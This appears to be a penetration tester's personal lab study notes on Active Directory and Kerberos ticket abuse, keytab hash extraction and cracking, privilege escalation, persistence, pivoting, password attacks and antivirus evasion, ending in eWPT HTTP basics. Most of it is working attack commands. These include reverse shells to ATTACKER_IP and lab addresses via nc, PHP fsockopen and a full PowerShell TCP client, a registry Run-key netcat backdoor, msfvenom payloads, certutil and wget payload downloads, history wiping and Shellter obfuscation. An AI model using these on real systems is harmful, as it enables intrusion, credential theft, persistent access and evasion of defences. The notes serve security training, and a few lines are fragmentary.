        c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
    > Note that now it displays Ticket successfully imported!.
    > Another way is to import the ticket into the current session using the .kirbi file from the disk.
    > Let's use a ticket exported from Mimikatz and import it using Pass the Ticket.
    > Rubeus - Pass the Ticket
        c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi

    > We can also use the base64 output from Rubeus or convert a .kirbi to base64 to perform the Pass the Ticket attack. We can use PowerShell to convert a .kirbi to base64.
    > Convert .kirbi to Base64 Format
        PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
    > Using Rubeus, we can perform a Pass the Ticket providing the base64 string instead of the file name.
    > Pass the Ticket - Base64 Format

* Pass The Ticket with PowerShell Remoting (Windows)
    > PowerShell Remoting(https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows us to run scripts or commands on a remote computer. Administrators often use PowerShell Remoting to manage remote computers on the network. Enabling PowerShell Remoting creates both HTTP and HTTPS listeners. The listener runs on standard port TCP/5985 for HTTP and TCP/5986 for HTTPS.
    > To create a PowerShell Remoting session on a remote computer, you must have administrative permissions, be a member of the Remote Management Users group, or have explicit PowerShell Remoting permissions in your session configuration.
    > Suppose we find a user account that doesn't have administrative privileges on a remote computer but is a member of the Remote Management Users group. In that case, we can use PowerShell Remoting to connect to that computer and execute commands.
    > Mimikatz - PowerShell Remoting with Pass the Ticket
        + To use PowerShell Remoting with Pass the Ticket, we can use Mimikatz to import our ticket and then open a PowerShell console and connect to the target machine. Let's open a new cmd.exe and execute mimikatz.exe, then import the ticket we collected using sekurlsa::tickets /export. Once the ticket is imported into our cmd.exe session, we can launch a PowerShell command prompt from the same cmd.exe and use the command Enter-PSSession to connect to the target machine.

[+] Pass the ticket (PtT) from Linux
    > Although not common, Linux computers can connect to Active Directory to provide centralized identity management and integrate with the organization's systems, giving users the ability to have a single identity to authenticate on Linux and Windows computers.
    > A Linux computer connected to Active Directory commonly uses Kerberos as authentication. Suppose this is the case, and we manage to compromise a Linux machine connected to Active Directory. In that case, we could try to find Kerberos tickets to impersonate other users and gain more access to the network.
    > A Linux system can be configured in various ways to store Kerberos tickets. We'll discuss a few different storage options in this section.
    > Note: A Linux machine not connected to Active Directory could use Kerberos tickets in scripts or to authenticate to the network. It is not a requirement to be joined to the domain to use Kerberos tickets from a Linux machine.

* Kerberos on Linux
    > Windows and Linux use the same process to request a Ticket Granting Ticket (TGT) and Service Ticket (TGS). However, how they store the ticket information may vary depending on the Linux distribution and implementation.
    > In most cases, Linux machines store Kerberos tickets as ccache(https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) files in the /tmp directory. By default, the location of the Kerberos ticket is stored in the environment variable KRB5CCNAME. This variable can identify if Kerberos tickets are being used or if the default location for storing Kerberos tickets is changed. These ccache files are protected by reading and write permissions, but a user with elevated privileges or root privileges could easily gain access to these tickets.
    > Another everyday use of Kerberos in Linux is with keytab(https://kb.iu.edu/d/aumh) files. A keytab is a file containing pairs of Kerberos principals and encrypted keys (which are derived from the Kerberos password). You can use a keytab file to authenticate to various remote systems using Kerberos without entering a password. However, when you change your password, you must recreate all your keytab files.
    > Keytab files commonly allow scripts to authenticate automatically using Kerberos without requiring human interaction or access to a password stored in a plain text file. For example, a script can use a keytab file to access files stored in the Windows share folder.
    > Note: Any computer that has a Kerberos client installed can create keytab files. Keytab files can be created on one computer and copied for use on other computers because they are not restricted to the systems on which they were initially created.




* Scenario

    > To practice and understand how we can abuse Kerberos from a Linux system, we have a computer (LINUX01) connected to the Domain Controller. This machine is only reachable through MS01. To access this machine over SSH, we can connect to MS01 via RDP and, from there, connect to the Linux machine using SSH from the Windows command line. Another option is to use a port forward.
        C:\Users\david>hostname
                        ssh david@inlanefreight.htb@172.16.1.15
    > As an alternative, we created a port forward to simplify the interaction with LINUX01. By connecting to port TCP/2222 on MS01, we will gain access to port TCP/22 on LINUX01.
    > Let's assume we are in a new assessment, and the company gives us access to LINUX01 and the user david@inlanefreight.htb and password Password2.
    > Linux Auth via Port Forward
        m1l0js@htb[/htb]$ ssh david@inlanefreight.htb@10.129.204.23 -p 2222

* Identifying Linux and Active Directory Integration
    > We can identify if the Linux machine is domain join using realm (https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd), a tool used to manage system enrollment in a domain and set which domain users or groups are allowed to access the local system resources.
    > realm - Check If Linux Machine is Domain Joined
        david@inlanefreight.htb@linux01:~$ realm list
    > The output of the command indicates that the machine is configured as a Kerberos member. It also gives us information about the domain name (inlanefreight.htb) and which users and groups are permitted to log in, which in this case are the users David and Julio and the group Linux Admins.
    > In case realm is not available, we can also look for other tools used to integrate Linux with Active Directory such as sssd(https://sssd.io/) or winbind(https://www.samba.org/samba/docs/current/man-html/winbindd.8.html). Looking for those services running in the machine is another way to identify if it is domain joined. We can read this blog post(https://www.2daygeek.com/how-to-identify-that-the-linux-server-is-integrated-with-active-directory-ad/) for more details. Let's search for those services to confirm if the machine is domain joined.
    > PS - Check if Linux Machine is Domain Joined
        david@inlanefreight.htb@linux01:~$ ps -ef | grep -i "winbind\|sssd"
    > id - Check if Linux Machine is Domain Joined

            uid=1918901106(daygeek) gid=1918900513(domain users) groups=1918900513(domain users)

        # cat /etc/pam.d/system-auth  | grep -i "pam_sss.so\|pam_winbind.so\|pam_ldap.so"

        # cat /etc/pam.d/system-auth-ac  | grep -i "pam_sss.so\|pam_winbind.so\|pam_ldap.

* Finding Kerberos Tickets in Linux
    > As an attacker, we are always looking for credentials. On Linux domain joined machines, we want to find Kerberos tickets to gain more access. Kerberos tickets can be found in different places depending on the Linux implementation or the administrator changing default settings. Let's explore some common ways to find Kerberos tickets.
    > Finding Keytab Files
        + A straightforward approach is to use find to search for files whose name contains the word keytab. When an administrator commonly creates a Kerberos ticket to be used with a script, it sets the extension to .keytab. Although not mandatory, it is a way in which administrators commonly refer to a keytab file.
        + Using Find to Search for Files with Keytab in the Name
            david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null
        + Note: To use a keytab file, we must have read and write (rw) privileges on the file.
        + Another way to find keytab files is in automated scripts configured using a cronjob or any other Linux service. If an administrator needs to run a script to interact with a Windows service that uses Kerberos, and if the keytab file does not have the .keytab extension, we may find the appropriate filename within the script. Let's see this example:
        + Identifying Keytab Files in Cronjobs
            carlos@inlanefreight.htb@linux01:~$ crontab -l
            <SNIP>
            # m h  dom mon dow   command
            *5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
            carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
            #!/bin/bash
            kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
            smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
        + In the above script, we notice the use of kinit, which means that Kerberos is in use. kinit allows interaction with Kerberos, and its function is to request the user's TGT and store this ticket in the cache (ccache file). We can use kinit to import a keytab into our session and act as the user.
        + In this example, we found a script importing a Kerberos ticket (svc_workstations.kt) for the user svc_workstations@INLANEFREIGHT.HTB before trying to connect to a shared folder. We'll later discuss how to use those tickets and impersonate users.
        + Note: As we discussed in the Pass the Ticket from Windows section, a computer account needs a ticket to interact with the Active Directory environment. Similarly, a Linux domain joined machine needs a ticket. The ticket is represented as a keytab file located by default at /etc/krb5.keytab and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account LINUX01$.INLANEFREIGHT.HTB
    
    > Finding ccache Files
        + A credential cache or ccache file holds Kerberos credentials while they remain valid and, generally, while the user's session lasts. Once a user authenticates to the domain, a ccache file is created that stores the ticket information. The path to this file is placed in the KRB5CCNAME environment variable. This variable is used by tools that support Kerberos authentication to find the Kerberos data. Let's look for the environment variables and identify the location of our Kerberos credentials cache:
        + Reviewing Environment Variables for ccache Files.
            david@inlanefreight.htb@linux01:~$ env | grep -i krb5
            KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
        + As mentioned previously, ccache files are located, by default, at /tmp. We can search for users who are logged on to the computer, and if we gain access as root or a privileged user, we would be able to impersonate a user using their ccache file while it is still valid.
        + Searching for ccache Files in /tmp
            david@inlanefreight.htb@linux01:~$ ls -la /tmp
            drwxrwxrwt 13 root                     root                           4096 Oct  6 16:38 .
            drwxr-xr-x 20 root                     root                           4096 Oct  6  2021 ..
            -rw-------  1 julio@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 16:38 krb5cc_647401106_tBswau

* Abusing KeyTab Files
    > As attackers, we may have several uses for a keytab file. The first thing we can do is impersonate a user using kinit. To use a keytab file, we need to know which user it was created for. klist is another application used to interact with Kerberos on Linux. This application reads information from a keytab file. Let's see that with the following command:
    > Listing keytab File Information
        david@inlanefreight.htb@linux01:~$ klist -k -t /opt/specialfiles/carlos.keytab 
        Keytab name: FILE:/opt/specialfiles/carlos.keytab

    > The ticket corresponds to the user Carlos. We can now impersonate the user with kinit. Let's confirm which ticket we are using with klist and then import Carlos's ticket into our session with kinit.
    > Note: kinit is case-sensitive, so be sure to use the name of the principal as shown in klist. In this case, the username is lowercase, and the domain name is uppercase.

        + Note: To keep the ticket from the current session, before importing the keytab, save a copy of the ccache file present in the enviroment variable KRB5CCNAME.

    > Keytab Extract
        + The second method we will use to abuse Kerberos on Linux is extracting the secrets from a keytab file. We were able to impersonate Carlos using the account's tickets to read a shared folder in the domain, but if we want to gain access to his account on the Linux machine, we'll need his password.
        + We can attempt to crack the account's password by extracting the hashes from the keytab file. Let's use KeyTabExtract(https://github.com/sosdave/KeyTabExtract), a tool to extract valuable information from 502-type .keytab files, which may be used to authenticate Linux boxes to Kerberos. The script will extract information such as the realm, Service Principal, Encryption Type, and Hashes.
        + Extracting Keytab Hashes with KeyTabExtract
            david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
            [*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
            [*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
            [*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
            [+] Keytab File successfully imported.

                    AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
        + With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password.
        + Note: A keypass file can contain different types of hashes and can be merged to contain multiple credentials even from different users.
        + The most straightforward hash to crack is the NTLM hash. We can use tools like Hashcat or John the Ripper to crack it. However, a quick way to decrypt passwords is with online repositories such as https://crackstation.net/, which contains billions of passwords.
            john --format=NT -w=/usr/share/wordlists/rockyou.txt carloshash
        + As we can see in the image, the password for the user Carlos is Password5. We can now log in as Carlos.
        + Log in as Carlos

        + Obtaining More Hashes
        + Carlos has a cronjob that uses a keytab file named svc_workstations.kt. We can repeat the process, crack the password, and log in as svc_workstations.

[+] Using Linux Attack Tools with Kerberos

    > Most Linux attack tools that interact with Windows and Active Directory support Kerberos authentication. If we use them from a domain-joined machine, we need to ensure our KRB5CCNAME environment variable is set to the ccache file we want to use. In case we are attacking from a machine that is not a member of the domain, for example, our attack host, we need to make sure our machine can contact the KDC or Domain Controller, and that domain name resolution is working.
    > In this scenario, our attack host doesn't have a connection to the KDC/Domain Controller, and we can't use the Domain Controller for name resolution. To use Kerberos, we need to proxy our traffic via MS01 with a tool such as Chisel(https://github.com/jpillora/chisel) and Proxychains(https://github.com/haad/proxychains) and edit the /etc/hosts file to hardcode IP addresses of the domain and the machines we want to attack.

This tool will extract all credentials, including Kerberos tickets, from different Kerberos implementations such as FreeIPA, SSSD, Samba, Vintella, etc. Once it extracts the credentials, it places them in a folder whose name starts with linikatz.. Inside this folder, you will find the credentials in the different available formats, including ccache and keytabs. These can be used, as appropriate, as explained above.

###Buffer overflow
	[+] A buffer is an area in the RAM reserved for temporary data storage. Buffers have a finite size; this means that they can only contain a certain amount of data. Buffers are stored in a special data structure in the computer memory called a stack (data structure used to store data). It uses LIFO (Last in First Out) with two methods:
  		> Push: Adds an element to the stack
  	  	> Pop: Removes the last inserted element
	
###General PrivEsc checklist
* Kernel exploits: Be careful for they cause system instability
* Vulnerable software
	> Linux 
		dpkg -l
	> Windows 
		C:\Program Files
* User privileges
	[+] Sudo: The sudo command in Linux allows a user to execute commands as a different user. It is usually used to allow lower privileged users to execute commands as root without giving them access to the root user. 
		sudo -l
			If 
				(ALL : ALL) ALL ==> It requires a password to run any commands with sudo
				sudo su -
			If 
				(user : user) NOPASSWD: /bin/echo ==> The NOPASSWD entry shows that the /bin/echo command can be executed without a password. This would be useful if we gained access to the server through a vulnerability and did not have the user's password. As it says user, we can run sudo as that user and not as root. 
				sudo -u user /bin/echo Hello world!

* Scheduled tasks
	[+] Cronjobs
		/etc/crontab
		/etc/cron.d
		/var/spool/cron/crontabs/root
		
	> Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.
	[+] Commands	
		net start //Services running in the background
        	wmic service list brief
        	tasklist /svc //List services running under that particular process
  		schtasks /query /fo list /v
      		schtasks /query /tn vulntask /fo list /v ==> vulntask = task 

	> Scheduled tasks can be listed from the command line using the schtasks command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:
	> You will get lots of information about the task, but what matters for us is the "Task to Run" parameter which indicates what gets executed by the scheduled task, and the "Run As User" parameter, which shows the user that will be used to execute the task.
	> If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use icacls:
		C:\> icacls c:\tasks\schtask.bat
		c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
		                    BUILTIN\Administrators:(I)(F)
		                    BUILTIN\Users:(I)(F)

	> As can be seen in the result, the BUILTIN\Users group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like. For your convenience, nc64.exe can be found on C:\tools. Let's change the bat file to spawn a reverse shell:
		C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
	> We then start a listener on the attacker machine on the same port we indicated on our reverse shell:
		nc -lvp 4444
	> The next time the scheduled task runs, you should receive the reverse shell with taskusr1 privileges. While you probably wouldn't be able to start the task in a real scenario and would have to wait for the scheduled task to trigger, we have provided your user with permissions to start the task manually to save you some time. We can run the task with the following command:
		C:\> schtasks /run /tn vulntask
	> And you will receive the reverse shell with taskusr1 privileges as expected:
		user@attackerpc$ nc -lvp 4444

	> We may read their private key

		/root/.ssh/id_rsa
	> If we find ourselves with write access to a users/.ssh/ directory, we can place our public key in the user's ssh directory at /home/user/.ssh/authorized_keys. This technique is usually used to gain ssh access after gaining a shell as that user. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user. We must first create a new key with ssh-keygen and the -f flag to specify the output file

[+] Access Token Impersonation
    + Windows access tokens are created and managed by the Local Security Authority Subsystem Service (LSASS)
    + Access tokens are generated by the winlogon.exe process every time a user authenticates successfully and includes the identity and privileges of the user account associated with the thread or process. This token is then attached to the userinit.exe process, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token.
    + An access token will typically be assigned one of the following security levels:
      	> Impersonate-level tokens are created as a direct result of a non-interactive login on Windows, typically through specific system services or domain logons.
        	Impersonate-level tokens can be used to impersonate a token on the local system and not on any external systems that utilize the token.
        	We can use the incognito module to display a list of available tokens that we can impersonate.
        	The following are the privileges that are required for a successful impersonation attack:
        	  - SeAssignPrimaryToken: This allows a user to impersonate tokens
        	  - SeCreateToken: This allows a user to create an arbitrary token with administrative privileges
        	  - SeImpersonatePrivilege: This allows a user to create a process under the security context of another user typically with administrative privileges.
      	> Delegate-level tokens are typically created through an interactive login on Windows, primarily through a traditional login or through remote access protocols such as RDP
        	Delegate-level tokens pose the largest threat as they can be used to impersonate tokens on any system.
    + Load incognito
	> Incognito is a built-in meterpreter module that was originally a standalone application that allows you to impersonate user tokens after successful exploitation

[+] Windows File system vulnerabilities --> ME INTERESA
* Alternate Data Streams
	> ADS is an NTFS(New Technology File System) file attribute and was designed to provide compatibility with the MacOS HFS(Hierarchical File System).
    	  Any file created on an NTFS formatted drive will have two different forks/streams:
		Data stream: Default stream that contains the data of the file
    	 	Resource stream: Typically contains the metadata of the file
    	> Attackers can use ADS to hide malicious code or executables in legitimate files in order to evade basic signature based AVs and static scanning tools. This can be done by storing the malicious code or executables in the file attribute resource stream (metadata) of a legitimate file. 
    	> notepad test.txt:secret.txt 
    	> change name winpeas.exe to payload.exe
    	> type payload.exe > windowslog.txt:winpeas.exe

[+] Windows Credential Dumping
	+ Windows Password Hashes
  		> Windows OS stores hashed user accounts and passwords locally in the SAM(Security Accounts Manager) database
  	  		The SAM database file cannot be copied while the operating system is running
  	  	    	The Windows NT kernel keeps the SAM database file locked and as a result, attackers typically utilize in-memory techniques and tools to dump SAM hashes from the LSASS process.
  	  	    	In modern versions of Windows, the SAM database is encrypted with a syskey.
  	  	> Authentication and verification of user credentials is facilitated by the LSA (Local Security Authority)
  	  		Elevated/Administrative privileges are required in order to access and interact with the LSASS process 
  	  	    	This service has a cache of memory with the hashes as it interacts with the SAM database
  	  	> Windows disables LM hashing and utilizes NTLM hashing from Windows Vista onwards
    
	+ LM(LanMan)
		Default hashing algorithm that was implemented in Windows OS prior to NT4.0
      		[+] The password is broken into two seven-character chunks 
      		[+] All characters are then converted into uppercase
      		[+] Each chunk is then hashed separately with the DES algorithm.
      		> Weak protocol, primarily because the password hash does not include salts, consequently making brute-force and rainbow table attacks effective against LM hashes
      		> Example: Password123 => PASSWO ==> RD123 ==> DES ==> HASH1 + HASH2 ==> LM Hash

	+ NTLM(NTHash)
		When a user account is created, it is encrypted using the MD4 hashing algorithm, while the original password is disposed of.
      		[+] Does not split the hash in to two chunks
      		[+] Case sensitive 
      		[+] Allows the use of symbols and unicode characters
      		[+] They do not have password salts, which means that can be cracked easy with rainbow tables or through brute-force attacks
      		> Example: !Passw0rd123. ==> MD4 ==> NTLM hash
[+] Searching for passwords in Windows Configuration files
	+ Unattended Windows Setup utility
		Windows can automate a variety of repetitive task(such as the installation of Windows on many systems) typically done through the use of the Unattended Windows Setup utility. 
      		This tool utilizes configuration files that contain specific configurations and user account credentials, specifically the Administrator account's password
      			[+] C:\Windows\Panther\Unattend.xml
      			[+] C:\Windows\Panther\Autounattend.xml
      		As a security precaution, the passwords stored in the Unattended Windows Setup configuration file may be encoded in base64

Transferring files to Windows & Linux targets
* Using python server
	Setting up a web server with Python
	    Python2 ==> SimpleHTTPServer
	    Python3 ==> http.server
	Transferring files to windows targets
  	  certutil -urlcache -f http://10.10.4.2/mimikatz.exe mimikatz.exe
  	Transferring files to Linux targets
  	  cd /tmp
  	  cd /usr/share/webshells/php/
  	  python3 -m http.server 80
  	  wget http://10.10.3.4/php-backdoor.php
    		If the remote server does not have wget, we can use cURL to download the file:
			curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
* Using scp
	Granted we have obtained ssh user credentials on the remote host.
		scp linenum.sh user@remotehost:/tmp/linenum.sh
* Using base64
	Maybe, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to base64 encode the file into base64 format, and then we can paste the base64 string on the remote server and decode it. For example, if we wanted to transfer a binary file called shell, we can base64 encode it as follows:
		base64 shell -w 0
	Now, we can copy this base64 string, go to the remote host, and use base64 -d to decode it, and pipe the output into a file
		echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
	Finally, we can use md5sum to ensure that the file not mess up

  Linux
    history -c 
    cat /dev/null  > bash_history
###Persistence
* What if we have to be persistent?
	[+] Using netcat
		We need to modify the regedit
      			1. Go to Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 
      		  	2. New ==> String ==> Type the name of the netcat file (for example winconfig)
      		  	3. Edit string ==> Value data ==> "C:\Windows\System32\winconfig.exe 192.168.0.10 4126 -e cmd.exe"

	[+] Using Metasploit
  		use exploit/windows/local/s4u_persistence
  	  	show options
  	  	sessions
  	  	set session 2
  	  	set trigger logon
  	  	set payload windows/meterpreter/reverse_tcp
  	  	set lhost 192.168.0.10
  	  	set lport 4126
  	  	show options
  	  	exploit
###Lateral Movement 
* How to pivot into networks?
	[+] Using Metasploit
		Add a route
			run autoroute -h
      			2 different ways 
      				> run autoroute -s 192.222.74.0/24 or run autoroute  -s 192.222.74.0 -n 255.255.255.0
      			  	> route add 192.222.74.0 255.255.255.0 1(meterpreter session ID)
      			background
      			route print

    		use exploit/multi/handler
    		set paload windows/meterpreter/reverse_tcp
    		show options
    		set lport 4126
    		screenshot
    		download personal_information.txt /root/Desktop
    		upload ..
    		sysinfo
    		ps

###Password attacks
* When you log into your computer, you type your username and password. The operating system takes the password, hashes it and then tries to match the result against the saved hash in the password database. If the two values match, you log in successfully. The operating system does not need to know the clear-text password.

* John the Ripper 
	[+] List of accepted formats
		john --list=formats
    	[+] To perform a pure brute force attack over a users list:
    		john --incremental --users:<users list> <file to crack>
    		john --wordlist=rockyou.txt --rules --users=victim1,victim2 hash //Other way
    	[+] Using single crack mode
    		john --single --format=[format] [path to file]
            john --single --format=sha256 hashes_to_crack.txt
    	[+] To display the password recovered:  
    		john --show crackme
    	[+] Default file where the cracked passwords are stored by John
    		/root/.john/john.pot
    	[+] It is a good idea if we are in Linux to check the 
    		/etc/login.defs to see the hash algorithm used to hash the password present in the shadow file
    	[+] Cool features
		/usr/share/john/office2john.py when .docx documents
    	[+] Unshadowing
    		unshadow - Invokes the unshadow tool
    	  	unshadow [path to passwd] [path to shadow] > crackme.txt
    	  	[path to passwd] - The file that contains the copy of the /etc/passwd file you've taken from the target machine
    	  	[path to shadow] - The file that contains the copy of the /etc/shadow file you've taken from the target machine 
        [+] --rules ==> to generate further candidate passwords
        
    	
* Rainbow table
	[+] It is a table containing links between the results of a run of one hashing function and another.
	[+] For Windows ==> ophcrack.

* Hashcat 
	[+] Relies in GPU instead of CPU
	[+] List of accepted formats
		hashcat --example-hashes

	[+] First steps
    		hashcat -b //First step
    		hashcat -m 0 -a 0 -D2 example.hash example.dict

	[+] Rules file
    		--rules-file ==> check it in hashcat page
  	[+] URLs

Windows Black Box Penetration Test
  Port scanning & enumeration
  Targeting Microsoft IIS FTP
    In most cases, the FTP server is used to transfer files to and from the directory of the web server. As a result, if we are able to gain access to the FTP server, we may be able access the directory of the Microsoft IIS web server.
    nmap -sV -p21 --script=ftp-anon 10.0.28.97
    //If we need valid credentials, we could use hydra with different lists users/passwords or users/users
    ftp 10.0.28.97 21
    msfvenom -p windows/shell/reverse_tcp LHOST=10.10.16.2 LPORT=1234 -f asp > shell.aspx
  Targeting SMB
    enum4linux -u vagrant -p vagrant 10.10.16.3 //Enumerate other user accounts
    python3 psexec.py administrator@10.10.16.3
  Targeting mysql
    //Once we are in, we could change several things
      UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin'; //For example
    Change the content in phpmyadmin.conf to Allow from all
    //Once you have done changes regarding with Apache you have to restart this service. This can be done with
      net stop wampapache
      net start wampapache

Linux exploitation
  Brute force with SMTP to a vulnerable vsftpd 
    msfconsole -q
      search smtp_enum
    //Once you have some users
    hydra -l service -P /usr/share/metasploit-framework/data/wordlists/unix_users.txt 10.2.17.5 ftp 
    //UPload a reverse shell 
    ls -al /usr/share/webshells/php-reverse-shell.php
    cp /usr/share/webshells/php-reverse-shell.php . //Change $ip and $port
    ftp 10.2.17.5 21
    cd /var/www/
    cd dav
    put shell.php //and nc -nvlp 1234 in our machine
  
  Targeting PHP
    10.2.19.172/phpinfo.php //Know some useful info with its version
    searchsploit php cgi //Lower than 5.3.12
    //We could use exploit/multi/http/php_cgi_arg_injection
    //If we try to modify 18836.py we could use this one liner to obtain a reverse shell
      $sock=fsockopen("IP",1234);exec("/bin/sh -i <&4 >&4 2>&4");

  Targeting Samba
   msfconsole -q
    search smb_version //It is valid for samba and smb
    use auxiliary/scanner/smb/smb_version  
AV evasion with Shelter
  Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include:
    - Uninstalling/disabling security software 
    - Obfuscating/encrypting data and scripts
    - Leverage and abuse trusted processes to hide and masquerade their malware
  //We are going to try to change the signature of the malicious executable that we are generating
  AV detection methods
    1. Signature based detection: An AV signature is a unique sequence of bytes that uniquely identifies malware. As a result, you will have to ensure that your obfuscated exploit or payload doesn't match any known signature in the AV database. 
      We can bypass signature-based detection by modifying the malware's byte sequence, therefore changing the signature
    2. Heuristic-based detection: Relies on rules or decisions to determine whether a binary is malicious. It also looks for specific patterns within the code or program calls
    3. Behavior based detection: Relies on identifying malware by monitoring it's behavior. Used for newer strains of malware
  AV evasion techniques
    On-disk evasion techniques
      1.  Obfuscation: Obfuscation relies to the process of concealing something important, valuable or critical. It reorganizes code in order to make it harder to analyze or RE
      2.  Encoding: Encoding data is a process involving changing data into a new format using a scheme. Encoding is a reversible process; data can be encoded to a new format and decoded to its original format
      3.  Packing: Generate executable with the new binary structure with a smaller size and therefore provides the payload with a new signature
      4.  Crypters: Encrypts code or payloads and decrypts the encrypted code in memory. The decryption key/function is usually stored in a stub
    In-Memory evasion techniques
      1.  Focuses on manipulation of memory and does not write files to disk
      2.  Injects payload into a process by leveraging various Windows APIs
      3.  Payload is then executed in memory in a separate thread
  Usage of shellter
    https://www.shellterproject.com/introducing-shellter/
    apt-get install shellter -y
    //We also need to install wine 32-bit package because shellter only supports any 32-bit payload (generated either by metasploit or custom ones by the user).
    dpkg --add-architecture i386
    apt-get install wine32
    //We could use the vncviewer.exe 
    cp /usr/share/windows-binaries/vncviewer.exe /home/kali/Desktop/AVBypass
    cd /usr/share/windows-resources/shellter
    sudo wine shellter.exe
      Auto mode
      /home/kali/Desktop/AVBypass/vncviewer.exe
      //Shellter will trace a random number of instructions 
      Enable Stealth Mode? Yes //If you want that executable work as intended.
      Payload? Listed payload 
      set lhost
      set lport
      msfconsole -q
        use multi/handler
        set payload windows/meterpreter/reverse_tcp
      python3 -m http.server 80
        //Execute it in the Windows machine 
  Obfuscating Powershell code
    git clone https://github.com/danielbohannon/Invoke-Obfuscation
    Use a reverse shell in powershell and save it as shell.ps1
      powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    apt-get install powershell -y
    pwsh
      cd ./Invoke-Obfuscation
      Import-Module ./Invoke-Obfuscation.ps1

eWPT(Notes)
The Rules of Engagement
  Why do you want to execute a penetration tester?
  When creating a timetable, it should contain at least the following information:
    - Target(s)
    - Start (format: Date-time)
    - End   (format: Date-time)
    - Criticality of test(format: text) //Medium, High, Low
    - Step in process(format: text) //Scanning, OS detection, exploitation, etc
    - Source IP address
A non-disclosure agreement
An emergency plan involves:
  - The timetable
  - The contact in charge of responding to the emergency plan
  - The solutions to apply to the issue

  Freemind(http://freemind.sourceforge.net/wiki/index.php/Download) //Mind mapping
  Your penetration test report's target audience groups are:
    - Executive: You have to speak in terms of metrics, risk mitigation and money loss
    - IT Department: Which areas or departments are more affected and to what kind of vulnerabilities
    - Development: Your exploits, your POCs, remediation tips, source code, etc
  A typical structure

Basics
  HTTP protocol basics
    Format of an HTTP message is
      HEADERS\r\n
      \r\n

      MESSAGE BODY\r\n

      \r(Carriage Return): moves the cursor to the beginning of the line
      \n(Line Feed): moves the cursor down to the next line
      \r\n: Is the same of hitting enter on your keyboard


    Note that a connection to www.google.com on port 80 is initiated before sending HTTP commands to the webserver
    HTTP Request:
      HTTP/1.1 ==> This is the HTTP protocol version that your browser wants to talk with. This basically informs the web server about which version of HTTP you would like to use in any further communication
      Host ==> It allows a web server to host multiple websites at a single IP address.
      Host value ==> Host value + Path combine to create the full URL you are requesting: the home page of www.google.com/
      User-Agent ==> Reveals your browser version, operating system and language to the remote web server
      Accept ==> Used by your browser to specify which document type is expected to be returned as a result of this request
      Accept-Encoding ==> Similar to accept, but it restricts the content codings that are acceptable in the response. Content codings are primarily used to allow a document to be compressed or transformed without losing the identity of its media type and without loss of information
      Connection ==> With HTTP 1.1 you can keep your connection to the remote web server open for an unspecified amount of time using the value "keep-alive". This indicates that all requests to the web server will continue to be sent through this connection without initiating a new connection every time (as in HTTP 1.0)

    HTTP response
      Date: Represents the date and time at which the message was originated
      Cache-Control: Allows the browser and the server to agree about caching rules. Cached contents save bandwidth because, in short, they prevent your browser from re-requesting contents that have not changed when the same resource is to be used.
      Content-Type: Lets the client know how to interpret the body of the message
      Content-Encoding: "gzip" Extends Content-Type. In this case the message body is compressed with gzip
      Server: "gws". Displays the web server banner. Apache and IIS are common web servers. Google uses this custom webserver banner (Google Web Server)
      Content-Length: Indicates the length, in bytes, of the message body
      
  Encoding
